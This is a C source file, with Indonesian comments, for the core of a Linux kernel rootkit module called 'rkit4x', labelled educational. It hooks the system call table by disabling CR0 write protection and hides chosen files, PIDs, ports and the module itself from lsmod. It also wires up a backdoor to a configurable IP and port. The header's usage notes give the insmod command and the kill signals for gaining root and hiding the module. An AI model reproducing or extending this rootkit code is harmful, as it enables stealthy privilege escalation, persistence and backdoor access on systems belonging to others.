/*
 * core.c — inti backend legacy: parameter + daftar + init/exit.
 *
 * Pemakaian:
 *   insmod rkit4x.ko hide="pages.php,rahasia.txt" hidepid="123" \
 *                     hideport="8080,4444" \
 *                     backdoor_ip=10.0.0.5 backdoor_port=4444
 *   kill -s63 1        -> root
 *   kill -s64 1        -> sembunyikan modul (lsmod kosong)
 *   kill -s62 1        -> tampilkan modul lagi (WAJIB sebelum rmmod)
 *   rmmod rkit4x       -> kembalikan sys_call_table, semua bersih
 *
 * Kontrol era ini pakai SINYAL (gaya Diamorphine) karena tidak ada
 * /proc/rkit — lihat l4x.h.
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/ctype.h>
#include <linux/slab.h>
#include <linux/errno.h>

#include "kver.h"
#include "l4x.h"

static char *hide;
static char *hidepid;
static char *hideport;              /* csv desimal */
module_param(hide,     charp, 0000);
module_param(hidepid,  charp, 0000);
module_param(hideport, charp, 0000);

static char g_names[L4X_MAX_HIDE][L4X_NAME_LEN];
static u32  g_pids[L4X_MAX_HIDE];
static u16  g_ports[L4X_MAX_PORT];
static int  g_nnames, g_npids, g_nports;

void l4x_list_init(const char *names_csv, const char *pids_csv,
		   const char *ports_csv)
{
	char *buf, *tok, *save;

	if (names_csv) {
		buf = kstrdup(names_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nnames < L4X_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					snprintf(g_names[g_nnames], L4X_NAME_LEN, "%s", tok);
					g_nnames++;
				}
			}
			kfree(buf);
		}
	}
	if (pids_csv) {
		buf = kstrdup(pids_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_npids < L4X_MAX_HIDE;
			     tok = strsep(&buf, ",")) {
				if (tok[0]) {
					g_pids[g_npids] = simple_strtoul(tok, &save, 10);
					if (g_pids[g_npids])
						g_npids++;
				}
			}
			kfree(buf);
		}
	}
	if (ports_csv) {
		buf = kstrdup(ports_csv, GFP_KERNEL);
		if (buf) {
			for (tok = strsep(&buf, ","); tok && g_nports < L4X_MAX_PORT;
			     tok = strsep(&buf, ",")) {
				unsigned long p = simple_strtoul(tok, &save, 10);

				if (p && p <= 65535)
					g_ports[g_nports++] = (u16)p;
			}
			kfree(buf);
		}
	}
	pr_info("l4x: daftar hide = %d nama, %d pid, %d port\n",
		g_nnames, g_npids, g_nports);
}

bool l4x_is_hidden_name(const char *name)
{
	int i;

	if (!name)
		return false;
	for (i = 0; i < g_nnames; i++)
		if (strcmp(g_names[i], name) == 0)
			return true;
	return false;
}

bool l4x_is_hidden_pid(const char *entry)
{
	u32 pid;
	int i, len;

	if (!entry || !entry[0] || !isdigit(entry[0]))
		return false;
	len = strnlen(entry, L4X_NAME_LEN);
	for (i = 0; i < len; i++)
		if (!isdigit(entry[i]))
			return false;
	pid = simple_strtoul(entry, NULL, 10);
	for (i = 0; i < g_npids; i++)
		if (g_pids[i] == pid)
			return true;
	return false;
	/* catatan: file bernama persis angka juga ikut tersembunyi —
	 * deteksi = bandingkan ls vs akses path langsung */
}

bool l4x_is_hidden_port(u16 port)
{
	int i;

	for (i = 0; i < g_nports; i++)
		if (g_ports[i] == port)
			return true;
	return false;
}

bool l4x_any_ports(void)
{
	return g_nports > 0;
}

static int __init rkit4x_init(void)
{
	int ret;

	pr_info("l4x: memuat backend legacy (2.6 - 4.19)\n");
	l4x_list_init(hide, hidepid, hideport);

	ret = l4x_hooks_init();          /* sys_call_table + CR0.WP */
	if (ret)
		return ret;

	/* ---- fitur opsional: gagal = peringatan saja ---- */
	if (l4x_modhide_init())
		pr_warn("l4x: self-hide nonaktif (KALLSYMS_ALL / symbol)\n");
	if (l4x_seq_init())
		pr_warn("l4x: conn-hide tidak aktif\n");
	if (l4x_backdoor_init())
		pr_info("l4x: backdoor NONAKTIF — set backdoor_ip saat insmod\n");

	pr_info("l4x: siap — uji di VM lama (4.4/4.15/4.18), docs/TESTING.md\n");
	return 0;
}

static void __exit rkit4x_exit(void)
{
	l4x_modhide_exit();      /* otomatis tampilkan bila tersembunyi */
	l4x_backdoor_exit();
	l4x_seq_exit();
	l4x_hooks_exit();        /* kembalikan sys_call_table */
	pr_info("l4x: dilepas — tabel syscall dipulihkan\n");
}

module_init(rkit4x_init);
module_exit(rkit4x_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("unified-rootkit (edukasi)");
MODULE_DESCRIPTION("Backend legacy: sys_call_table + CR0.WP + hide port/modul + backdoor (edukasi)");
